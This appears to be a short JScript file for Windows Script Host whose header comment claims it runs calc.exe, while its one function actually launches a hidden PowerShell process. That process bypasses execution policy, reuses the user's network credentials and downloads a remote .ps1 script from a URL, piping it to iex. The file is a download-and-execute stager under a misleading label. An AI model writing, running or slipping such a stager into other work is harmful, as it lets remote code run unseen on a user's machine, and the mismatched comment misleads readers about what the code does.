/***
 *
 * This File Run the calc.exe 
 *
**/
//runCalc();

function runPowerShell()
{
  var wshShell, szCmd;
  wshShell = new ActiveXObject("WScript.Shell");
  szCmd = "powershell -NoP -NonI -exec Bypass -WindowStyle Hidden -c \"Set-ExecutionPolicy Bypass -Scope Process -Force; (New-Object Net.WebClient).Proxy.Credentials=[Net.CredentialCache]::DefaultNetworkCredentials;(Invoke-WebRequest -Uri 'http://localhost:80/Hello-World/assets/Scripts/hellow-world.ps1' -Method GET -ContentType 'text/plain; charset=utf-8' -UseBasicParsing)|iex\"";
  wshShell.Run( szCmd );
}